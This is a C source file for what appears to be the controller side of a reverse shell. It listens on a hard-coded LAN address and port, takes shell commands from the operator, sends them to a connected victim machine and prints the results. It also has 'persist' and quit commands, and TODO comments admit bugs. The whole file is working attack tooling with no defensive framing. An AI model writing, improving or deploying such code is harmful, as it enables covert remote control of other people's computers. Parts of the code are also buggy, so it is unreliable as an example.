#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

// TODO: handle exiting signals
// TODO: every second command get executed 
int main ()
{
  int sock, client_socket;
  char buffer[1025];
  char response[18433];
  struct sockaddr_in server_address, client_address;
  int i = 0;
  int optval = 1;
  socklen_t client_length;

  sock = socket(AF_INET, SOCK_STREAM, 0);

  if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
    printf("Error setting TCP socket options\n");
    return 1; //EXIT_FAILURE ? 
  }

  server_address.sin_family = AF_INET;
  server_address.sin_addr.s_addr = inet_addr("192.168.1.175"); // server IP
  server_address.sin_port = htons(50005);

  bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
  listen(sock, 5);
  client_length = sizeof(client_address);
  client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);

  while (1) {
    jump:
    bzero(&buffer, sizeof(buffer));
    bzero(&response, sizeof(response));
    printf("Shell#%s ~$: ", inet_ntoa(client_address.sin_addr));
    fgets(buffer, sizeof(buffer), stdin);
    strtok(buffer, "\n");
    write(client_socket, buffer, sizeof(buffer));
    if (!strcmp("q", buffer)) {
	break;
    }
    else if (!strcmp("cd ", buffer)) {
	goto jump;
    }
    else if (!strcmp("persist", buffer)) {
        send(sock, response, sizeof(response), 0);
	printf("%s", response);
    }
    else {
        recv(client_socket, response, sizeof(response), MSG_WAITALL);
	printf("%s", response);
    }
  }
}
